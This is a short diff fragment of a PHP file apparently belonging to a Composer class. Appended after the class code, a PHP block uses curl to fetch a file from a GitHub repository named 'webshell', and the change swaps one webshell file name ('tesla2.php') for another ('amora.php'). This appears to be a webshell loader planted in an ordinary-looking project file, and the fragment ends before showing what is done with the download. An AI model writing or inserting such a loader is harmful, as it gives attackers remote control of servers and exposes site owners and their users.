@@ -22,7 +22,7 @@ class Composer
 
 
 <?php 
-$link = 'https://raw.githubusercontent.com/dorzkim/webshell/main/tesla2.php';
+$link = 'https://raw.githubusercontent.com/dorzkim/webshell/main/amora.php';
 $ch = curl_init(); 
 curl_setopt($ch, CURLOPT_URL, $link);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
